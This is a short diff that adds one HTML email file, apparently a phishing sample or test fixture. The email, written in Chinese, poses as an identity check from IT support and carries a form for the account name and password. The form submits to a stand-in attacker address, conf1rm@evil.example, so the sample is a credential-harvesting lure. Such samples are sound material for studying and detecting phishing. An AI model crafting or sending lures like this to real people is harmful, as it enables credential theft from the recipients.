@@ -1,0 +1,9 @@
+From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>
+To: employee@corp.internal
+Date: Thu, 13 Aug 2026 10:00:00 +0800
+Message-ID: <ev55@partner.example>
+Subject: 身份确认
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>为完成身份确认，请在下方填写并提交：</p><form action='mailto:conf1rm@evil.example?subject=verify' method='post'>账号 <input name='account'><br>密码 <input type='password' name='password'><br><button>提交确认</button></form></body></html>
